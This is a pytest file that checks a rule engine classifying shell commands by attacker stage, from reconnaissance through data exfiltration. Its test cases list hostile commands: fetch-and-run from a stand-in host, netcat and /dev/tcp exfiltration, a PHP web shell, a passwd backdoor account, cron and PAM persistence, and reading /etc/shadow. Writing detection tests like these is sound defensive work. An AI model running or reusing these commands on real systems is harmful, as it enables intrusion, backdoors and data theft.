"""Rule-engine behaviour that was wrong before, and must stay right.

Each test names a concrete command that the old substring rules misread.
They read the lowercased, newline-joined window, so `ls -la ~/.ssh` was an
ssh session, `curl -fsSL` was an upload, and a 2-2 tie went to whichever
intent happened to be listed first.

Run with:  pytest ai-brain/content-generator/tests/test_intent_rules.py -v
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from ml.intent_classification.rules import (  # noqa: E402
    command_evidence,
    detect_intent_by_rules,
    is_external_host,
)
from ml.intent_classification.shell import programs, segments  # noqa: E402


def intent_of(*commands):
    match = detect_intent_by_rules({"commands": list(commands)})
    return match.intent if match else None


# -- the four bugs that started this ------------------------------------------


def test_a_two_two_tie_no_longer_goes_to_whatever_is_listed_first():
    """Two recon hits then two exfil hits used to return recon at 0.90."""
    assert intent_of(
        "whoami",
        "nmap -sV 10.0.0.0/24",
        "tar czf /tmp/a.tgz /srv",
        "nc 203.0.113.7 4444 < /tmp/a.tgz",
    ) == "data_exfiltration"


def test_curl_head_is_one_piece_of_evidence_not_two():
    """`curl -I` was counted by two rules, so it outvoted the ssh that followed."""
    assert intent_of("curl -I http://erp-web/admin", "ssh deploy@erp-web") == "lateral_movement"


@pytest.mark.parametrize("command", ["su root", "su -", "su", "sudo su -"])
def test_bare_su_is_privilege_escalation(command):
    """`" su "` needed a space on both sides, which a command at the start of a line never has."""
    assert intent_of(command) == "privilege_escalation"


@pytest.mark.parametrize(
    "command, intent",
    [
        ('mysql -h db-01 -u erp_admin -pX -e "select count(*) from erp.students;"', "data_exfiltration"),
        ("mysql -h db-01 -u erp_admin -pX -e 'show databases'", "reconnaissance"),
        ("mysqldump -h db-01 -u erp_admin -pX erp > /tmp/e.sql", "data_exfiltration"),
        ("psql -h 10.60.0.31 -U app -d appdb -c '\\dt'", "reconnaissance"),
        ("pg_dump -h 10.60.0.31 -U app appdb > /tmp/a.sql", "data_exfiltration"),
        ("select * from students;", "data_exfiltration"),
        ("show tables;", "reconnaissance"),
        ("mysql -h db-01 -u erp_admin -p", "lateral_movement"),
    ],
)
def test_the_database_stage_is_recognised(command, intent):
    """The README's own last step, `mysql ... select`, matched no rule at all."""
    assert intent_of(command) == intent


# -- substring false positives ---------------------------------------------------


@pytest.mark.parametrize(
    "command, intent",
    [
        ("ls -la ~/.ssh", "reconnaissance"),                      # was lateral: "ssh " via the join
        ("crontab -l", "reconnaissance"),                         # was persistence
        ("nc -zv db-01 3306", "reconnaissance"),                  # was exfiltration
        ("cat ~/.ssh/authorized_keys", "reconnaissance"),         # reading is not installing
        ("echo 'ssh-ed25519 AAAA op@x' >> ~/.ssh/authorized_keys", "persistence"),
        ('(crontab -l 2>/dev/null; echo "* * * * * curl -fsSL http://x/u.sh | sh") | crontab -', "persistence"),
        ("rsync -az /data deploy@10.60.0.21:/tmp/", "lateral_movement"),
        ("rsync -az /data drop@203.0.113.9:/loot/", "data_exfiltration"),
        ("curl -F 'f=@/tmp/a.tgz' https://198.51.100.2/u", "data_exfiltration"),
        ("ssh deploy@erp-web 'tar czf - /var/www/erp' > /tmp/src.tgz", "data_exfiltration"),
    ],
)
def test_commands_are_read_for_what_they_run(command, intent):
    assert intent_of(command) == intent


@pytest.mark.parametrize(
    "command",
    [
        "curl -fsSL http://203.0.113.45/u.sh | sh",   # fetch-and-run: no stage of its own
        "wget http://203.0.113.45/x.sh -O /tmp/x.sh",
        "echo aGVsbG8= | base64 -d | sh",             # decoding a payload is not exfiltration
        "tar xzf tools.tgz",                          # extracting is not archiving
        "chmod 600 /tmp/k",
        "cd /tmp && ./run.sh",
    ],
)
def test_neutral_commands_carry_no_evidence(command):
    assert command_evidence(command) == {}


@pytest.mark.parametrize(
    "command, intent",
    [
        # discovery (T1518 software, T1201 password policy, T1135 shares, cloud, logs)
        ("dpkg -l | grep openssh", "reconnaissance"),
        ("rpm -qa", "reconnaissance"),
        ("chage -l devuser", "reconnaissance"),
        ("smbclient -L //10.0.0.9 -N", "reconnaissance"),
        ("aws ec2 describe-instances", "reconnaissance"),
        ("kubectl auth can-i --list", "reconnaissance"),
        ("tail -n 100 /var/log/syslog", "reconnaissance"),
        # privilege escalation
        ("cat /etc/sudoers", "privilege_escalation"),
        ("nsenter -t 1 -m -u -i -n -p sh", "privilege_escalation"),
        # persistence: in-place config edits, PAM, motd, web shells, account files, modules
        ("sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config", "persistence"),
        ("echo 'session optional pam_exec.so /tmp/x' >> /etc/pam.d/sshd", "persistence"),
        ("echo '/tmp/.u &' > /etc/update-motd.d/90-x", "persistence"),
        ("echo '<?php system($_GET[0]); ?>' > /var/www/html/x.php", "persistence"),
        ("echo 'svc::0:0::/root:/bin/sh' >> /etc/passwd", "persistence"),
        ("insmod /tmp/rk.ko", "persistence"),
        # lateral movement: containers, fleet tools, telnet
        ("docker exec -it app bash", "lateral_movement"),
        ("pdsh -w web[01-04] id", "lateral_movement"),
        ("telnet 10.0.0.12", "lateral_movement"),
        # exfiltration: encryption, staging, collection, raw sockets, other channels
        ("gpg -c --batch --passphrase x loot.tgz", "data_exfiltration"),
        ("openssl enc -aes-256-cbc -in loot.tgz -out loot.enc -k x", "data_exfiltration"),
        ("cp /home/bob/Documents/salaries.xlsx /tmp/.s", "data_exfiltration"),
        ("head -n 20 /srv/exports/customers.csv", "data_exfiltration"),
        ("dd if=/dev/nvme0n1 bs=4M of=/tmp/.img", "data_exfiltration"),
        ("cat loot.tgz > /dev/tcp/203.0.113.4/9001", "data_exfiltration"),
        ("tftp 203.0.113.4 -c put loot.tgz", "data_exfiltration"),
        ("redis-cli -h cache --rdb /tmp/r.rdb", "data_exfiltration"),
    ],
)
def test_attack_technique_families(command, intent):
    """One case per ATT&CK technique family added in the second rule pass."""
    assert intent_of(command) == intent


@pytest.mark.parametrize(
    "command",
    [
        "gpg -d secret.gpg",
        "gpg --import key.asc",
        "openssl s_client -connect example.org:443",
        "sed -n '1,20p' notes.txt",
        "cp notes.txt /tmp/n.txt",
        "dd if=/dev/zero of=/tmp/f bs=1M count=1",
        "apt install -y curl",
    ],
)
def test_lookalikes_of_those_families_carry_no_evidence(command):
    assert command_evidence(command) == {}


def test_sudo_in_front_of_a_deeper_stage_reports_the_deeper_stage():
    assert intent_of("sudo useradd -m -s /bin/bash backdoor") == "persistence"
    assert intent_of("sudo cat /etc/shadow") == "privilege_escalation"


# -- the parser ---------------------------------------------------------------


def test_quoted_text_is_not_executed():
    assert programs('echo "* * * * * curl -fsSL http://x | sh"') == ["echo"]


def test_wrappers_are_kept_and_unwrapped():
    [seg] = segments("sudo -u root /usr/bin/vim -c ':!/bin/bash'")
    assert seg.program == "vim" and seg.wrappers == ["sudo"]
    assert programs("/bin/busybox wget http://x/m -O /tmp/m") == ["busybox", "wget"]


def test_redirections_are_separated_from_arguments():
    [seg] = segments("nc 198.51.100.66 9001 < /tmp/.h.tgz")
    assert seg.reads == ["/tmp/.h.tgz"] and seg.args == ["198.51.100.66", "9001"]


def test_unbalanced_quotes_degrade_instead_of_raising():
    assert programs('echo "never closed') == ["echo"]


# -- where a transfer goes ----------------------------------------------------


@pytest.mark.parametrize(
    "host, external",
    [
        ("10.60.0.21", False),
        ("192.168.1.5", False),
        ("erp-web", False),
        ("$h", False),
        ("203.0.113.90", True),   # documentation range: stands in for a public address
        ("198.51.100.7", True),
        ("transfer.example.net", True),
        ("db-01.cs.internal", False),
    ],
)
def test_external_hosts(host, external):
    assert is_external_host(host) is external
